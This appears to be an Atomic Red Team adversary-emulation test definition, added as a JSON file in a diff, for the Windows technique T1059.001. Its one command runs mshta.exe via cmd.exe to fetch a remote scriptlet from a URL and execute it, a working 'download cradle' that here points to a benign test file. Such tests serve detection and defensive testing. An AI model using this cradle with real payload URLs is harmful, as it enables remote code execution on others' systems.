@@ -1,0 +1,31 @@
+{
+  "id": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
+  "name": "Powershell invoke mshta.exe download",
+  "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "56604624-3cd3-44de-8635-eaf60a8476db",
+      "type": "execute-command",
+      "data": {
+        "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1059.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "url",
+      "type": "url",
+      "description": "url of payload to execute",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"
+    }
+  ]
+}
